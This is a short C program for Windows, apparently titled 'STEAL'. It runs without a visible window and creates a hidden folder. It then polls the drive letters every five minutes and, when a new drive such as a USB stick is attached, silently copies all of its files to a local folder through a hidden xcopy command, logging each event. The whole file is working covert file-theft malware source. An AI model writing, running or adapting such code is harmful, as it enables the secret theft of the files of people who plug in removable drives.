#define Relese
#include <Windows.h>
#include <time.h>
#include <stdio.h>
#include <io.h>
#ifndef DEBUG
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#endif
#pragma warning (disable : 4996)//关闭4996警告
#pragma warning (disable : 28159)
const char sys[] = { 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z' };

void fileA(int a,int win_A,int win_B) {
	time_t times;
	time(&times);
	FILE* fp;
	fp = fopen("log.txt", "a+");
	if (a == 2) fprintf(fp, "%s A:%d B:%d\n", ctime(&times), win_A, win_B);
	if (a == 1) fprintf(fp, "%s 初始化完成\n", ctime(&times));
	fclose(fp);
}
int main(){
	DWORD win_A = GetLogicalDrives();
	int a[26] = { 0 }, b[26] = {0};
	if (access("log.txt", 0)) {
		system("md steal && Attrib +h steal && cd.>log.txt");
		MessageBox(NULL, L"初始化成功", L"STEAL", MB_OK);
	}
	while (1) {
		DWORD win_B = GetLogicalDrives();
		if (win_B != win_A) {
			char str[50];
			for (int num = 0; win_A > 0; ++num) {
				a[num] = win_A % 2;
				win_A /= 2;
			}
			for (int num = 0; win_B > 0; ++num)
			{
				b[num] = win_B % 2;
				win_B /= 2;
				if (a[num] != b[num]) {
					sprintf(str, "xcopy %c: .\\sneak /e /y /d", sys[num]);
#ifdef DEBUG
					printf("执行指令:%s\n", str);
#else
					WinExec(str, SW_HIDE);
#endif // DEBUG
					fileA(2, win_A, win_B);
				}
			}
		}
#ifdef DEBUG
		Sleep(1000);
#else
		Sleep(300000);//五分钟
#endif // DEBUG
	}
}
